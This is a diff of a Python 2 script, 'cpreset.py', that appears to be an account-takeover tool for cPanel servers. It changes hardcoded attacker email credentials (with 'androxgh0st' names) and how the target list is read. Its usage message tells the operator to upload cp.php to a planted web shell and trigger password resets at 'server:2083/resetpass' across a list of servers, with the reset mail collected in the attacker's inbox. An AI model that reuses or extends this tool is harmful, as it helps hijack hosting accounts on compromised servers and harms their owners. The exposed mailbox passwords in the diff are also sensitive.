@@ -13,8 +13,8 @@ import random
 import string
 requests.packages.urllib3.disable_warnings()
 
-EMAIL_ACCOUNT = "androxgh0st@jiwaterlena.org" # change to our email
-PASS_EMAIL = "root@jtt1337" # Password our email
+EMAIL_ACCOUNT = "sanninkonohagakure@gmail.com" # change to our email
+PASS_EMAIL = "androxgh0st$" # Password our email
 
 def genpass(stringLength=10):
 	lettersAndDigits = string.ascii_letters + string.digits
@@ -145,7 +145,7 @@ def gass(cpurl):
 	M.logout()
 
 try:
-	text = open(sys.argv[1])
+	text = open(sys.argv[1]).read()
 except:
 	print("Remember, Change Email & Password In Script (Inbox/Spam Folder All Deleted in our mail)\nAnd Upload cp.php to shell (Password reset enabled)\nCheck on \"https://server:2083/resetpass\"\n\nRun with: python2 cpreset.py ourlist.txt")
 	exit()
